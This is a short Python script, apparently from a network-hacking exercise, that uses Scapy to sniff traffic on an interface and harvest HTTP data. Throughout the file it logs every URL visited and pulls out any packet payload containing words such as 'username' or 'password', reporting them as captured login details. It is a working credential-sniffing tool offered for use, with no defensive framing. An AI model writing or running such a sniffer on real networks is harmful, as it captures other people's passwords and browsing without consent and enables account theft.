import logging  # Import the logging library for better control over log messages
import scapy.all as scapy  # Import all functions from Scapy for packet manipulation
from scapy.layers import http  # Import HTTP layer handling capabilities from Scapy

# Configure logging settings
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def sniff(interface):
    """
    Start sniffing on the specified network interface.
    :param interface: The network interface to sniff on.
    """
    # Start sniffing on the specified interface, without storing packets, 
    # and call process_sniffed_packet for each packet captured
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    """
    Extract and return the URL from the HTTP request packet.
    :param packet: The packet from which to extract the URL.
    :return: The URL from the HTTP request.
    """
    # Concatenate the Host and Path fields from the HTTP request to form the URL
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    """
    Extract possible login information from the packet.
    :param packet: The packet from which to extract login information.
    :return: The extracted login information if any keywords are found.
    """
    if packet.haslayer(scapy.Raw):  # Check if the packet has a Raw layer (contains payload data)
        load = str(packet[scapy.Raw].load)  # Convert the payload data to a string
        keywords = ["username", "user", "login", "password", "pass"]  # List of keywords to search for
        for keyword in keywords:  # Iterate over each keyword
            if keyword.lower() in load.lower():  # Check if the keyword is present in the payload (case insensitive)
                return load  # Return the payload if a keyword is found

def process_sniffed_packet(packet):
    """
    Process sniffed packet to find and print HTTP requests and possible login information.
    :param packet: The packet to process.
    """
    try:
        if packet.haslayer(http.HTTPRequest):  # Check if the packet contains an HTTP request
            url = get_url(packet)  # Extract the URL from the HTTP request packet
            logging.info(f"HTTP Request >> {url.decode()}")  # Log the URL of the HTTP request
            
            if login_info := get_login_info(packet):  # Extract and check for login information using a named expression
                logging.info(f"Possible username/password > {login_info}")  # Log the possible login information
    except Exception as e:  # Catch any exceptions that occur
        logging.error(f"Error processing packet: {e}")  # Log the error message

# Example usage
if __name__ == "__main__":
    sniff("eth0")  # Start sniffing on the specified network interface (e.g., "eth0")
